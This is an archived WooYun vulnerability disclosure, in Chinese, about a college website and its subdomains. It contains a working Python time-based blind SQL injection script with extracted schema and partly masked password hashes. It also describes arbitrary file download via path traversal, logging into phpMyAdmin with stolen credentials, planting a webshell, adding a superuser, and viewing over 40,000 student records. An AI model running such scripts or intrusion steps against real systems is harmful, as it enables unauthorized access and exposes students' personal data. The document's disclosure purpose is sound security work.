{"id": 70149, "wybug_id": "wooyun-2015-0135501", "wybug_title": "某学院主站+分站漏洞打包（4w+学生数据泄露）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-08-22 21:29", "wybug_open_date": "2015-10-09 10:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "后台被猜解"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-25：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-09-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-09：\t细节向公众公开  简要描述： 额，没啥说的，直接往下看吧。 详细说明：  网站地址：http://**.**.**.**一开始扫到一个注入点http://**.**.**.**/home/list.php?class_id=1\n\n但是是时间盲注，而且sqlmap识别不了，对我这样的菜鸟来说，sqlmap解决不了的一般也就放弃了。但是python也学一段时间了，总想试试，于是写了个盲注的脚本（代码写的比较渣，不要在意那些细节）\n#-*- coding:utf-8 -*-import urllib2payload = [\"database()\",\"current_user\",\"session_user()\",\"version()\"]url1 = \"http://**.**.**.**/home/list.php?class_id=if(\"url2 = \",sleep(5),0)\"def length(name):    low = 0 ; high = 40 ; ave = 20    while low<high :        url = url1+\"length(\"+name+\")\"+ \">\"+ str(ave) +url2        if(connet(url)):            low = ave+1        else:            high = ave-1        ave = (low+high)/2    if connet(url1+\"length(\"+name+\")\"+ \"=\"+ str(ave) +url2):        return ave    elif connet(url1+\"length(\"+name+\")\"+ \"=\"+ str(ave-1) +url2):        return ave-1    elif connet(url1+\"length(\"+name+\")\"+ \"=\"+ str(ave+1) +url2):        return ave+1    else:        return \"NULL\"                def connet(url):    try:        con = urllib2.urlopen(url,timeout=2)    except :        return True    return Falsedef get_data():    for name in payload:        leg = length(name)        result = \"\"        for i in range(1,leg+1):            low = 32 ; high = 128 ; ave = 80            while low<high:                url = url1+\"ascii(substr(\"+ name +\",\"+str(i)+\",1))\"+ \">\"+ str(ave) +url2                #print url                if(connet(url)):                    low = ave+1                else:                    high = ave-1                ave = (low+high)/2            #print ave            if connet(url1+\"ascii(substr(\"+ name +\",\"+str(i)+\",1))\"+ \"=\"+ str(ave) +url2):                result += chr(ave)            elif connet(url1+\"ascii(substr(\"+ name +\",\"+str(i)+\",1))\"+ \"=\"+ str(ave-1) +url2):                result += chr(ave-1)            elif connet(url1+\"ascii(substr(\"+ name +\",\"+str(i)+\",1))\"+ \"=\"+ str(ave+1) +url2):                result += chr(ave+1)            else:                result += \" \"        print name,resultif __name__==\"__main__\":    get_data()\n运行结果：\ndatabase() xiehecurrent_user root@localhostsession_user() root@localhostversion() 5.1? 6??????????\n有一些乱码，因为那个网站跑着跑着就响应缓慢，严重影响盲注的效果。然后再深入的时候发现不能用select，，，，，，不应该呀！一段时间之后，，，，发现对网址进行url编码就好了。╥﹏╥...另外对程序作了改进，为了防止出现乱码的情况，放慢请求速度，真的很慢，获取数据库的其他信息，以下用到的程序，都是根据上面改进，相差不多，就不贴了。数据库名\ninformation_schemamysqltestxiehe\nxiehe的表名\n0 t_class1 t_enter2 t_info3 t_upload4 t_user5 t_user_class\nt_user的字段\n0 user_name1 user_password2 user_status3 user_righ4 grant_ipst5 real_name6 user_departmenr7 contact_ el8 page_size9 create_user10 create_time11 create_ip12 update_user13 update_time14 update_ip\n因为速度太慢，具体数据只拿了前几个，（做了下*处理）\nuser_name    user_password                              0 admin      482beea1d6c225e5d42b20e6e05e4f1*1 bwc        c8bfc9cd46e2b7494cd2b5433b6b46b*  2 cxzy       3196e44b13955235245b2497399d7a9*       3 cyjd       64eecaecfe8835a6cf11589dc3336c9*  4 dtw        3d186804534370c3c717db0563f0e46*  5 dzb        83126fe8aed4cf4568aebc6683769b5*\n怀着激动的心情去登陆后台http://**.**.**.**/admin/login.php，结果\n\n做了登陆限制么，泪崩啊！（以上过程持续了两天）本来想放弃的，但是不甘心啊，手贱，扫了下子域名，\n1.http://**.**.**.**2.http://**.**.**.**3.http://**.**.**.**4.http://vod.**.**.**.**5.http://**.**.**.**\n先试了下第一个站，http://**.**.**.**，精品课程网随便点击去一个课程，发现网址是这样的，只想说，那个url参数太可爱了http://**.**.**.**/zyzdx/best/sjlx/main.html?id=1&url=../../vedio/sjlx/发现可以包含其他文件，但是也不好利用，然后找到了一个下载链接，网址也是这样的http://**.**.**.**/zyzdx/best/sbcl/download.php?url=../d%3C.php可以下载任意文件，然后利用<字符猜解+burp爆破+目录扫描，找到好几个config.php文件，其中一个为数据库配置文件\n\n成功登陆phpmyadmin，导出小马:http://**.**.**.**/phpinfo22.php先试了下提权，不能添加用户，然后看了下数据，（高潮来了）\n\n两个库一共4w+的数据，如果没有看错的话，然后查看管理员信息，登录后台http://**.**.**.**/admin/login.php\n\n但并没有什么有用的信息，然而这有一个招生管理系统登录，应该是两个http://**.**.**.**/zsgl2013/login.phphttp://**.**.**.**/zsgl2014/login.php用在数据库中找的用户名和密码成功登陆，还是大量的学生数据啊\n\n还可以做其他操作\n\n接下来提权还是没能成功。。。。。。。然后看这个子域名http://vod.**.**.**.**是一个视频点播系统，同样有phpmyadmin：http://vod.**.**.**.**/pma/index.php用刚才的用户名密码成功登陆，后台管理也是那一个，然后导出小马，成功添加超级用户\n\n3389好像开了，但是对方在内网，我也在内网，不好连接，就没深入下去。。。   漏洞证明：  都在上面的详细说明里了。   修复方案：  感觉要做好多，还是找专业的吧。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-08-25 10:28 厂商回复： 已经转报给教育网应急组织_赛尔网络公司. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}